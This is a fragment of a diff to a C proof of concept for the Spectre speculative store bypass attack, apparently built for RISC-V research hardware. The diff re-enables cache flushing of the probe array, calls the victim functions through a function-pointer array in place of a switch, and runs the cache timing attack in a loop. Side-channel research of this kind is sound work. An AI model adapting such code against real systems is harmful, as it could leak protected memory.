@@ -6,7 +6,6 @@
 //#include <stdlib.h> // For rand() and srand()
 //#include <time.h> // For time(NULL)
 #include "util_riscv.h"
-#include "util_shared.h"
 #include "cache.h"
 
 // Remind: Spectre SSB  will only succeed on machines with MDP (Memory Dependence Prediction) and speculative STL forwarding.
@@ -183,10 +182,11 @@ void main(){
 		for(uint32_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
 
 			// Make sure array you read from is not in the cache.
-//			flushCache((uint32_t)probeArray, sizeof(probeArray));
+			flushCache((uint32_t)probeArray, sizeof(probeArray));
 
 			victimFuncInit(attackIdx);
-			switch (len) {
+			victimFunc[len](attackIdx);
+/*			switch (len) {
 				case 0:
 					victimFunc_00(attackIdx);
 					break;
@@ -205,7 +205,7 @@ void main(){
 				default:
 					break;
 			}
-
+*/
 			cacheAttack(hitIdx, hitTimes);
 
 		}
